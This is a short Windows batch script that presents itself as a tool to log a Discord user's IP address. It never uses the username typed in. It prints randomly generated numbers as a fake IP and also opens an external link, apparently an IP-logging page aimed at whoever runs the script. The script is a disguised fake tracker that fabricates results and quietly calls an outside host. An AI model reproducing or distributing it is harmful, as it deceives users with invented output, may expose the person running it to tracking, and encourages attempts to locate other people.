@echo off
cls
echo track IP
:generate
set /p userInput=enter discord username and hit enter to log ip:
start https://mymap.icu/72CP7N
set /a oct1=%random% %% 256
set /a oct2=%random% %% 256
set /a oct3=%random% %% 256
set /a oct4=%random% %% 256
echo %oct1%.%oct2%.%oct3%.%oct4%
goto generate
pause
exit
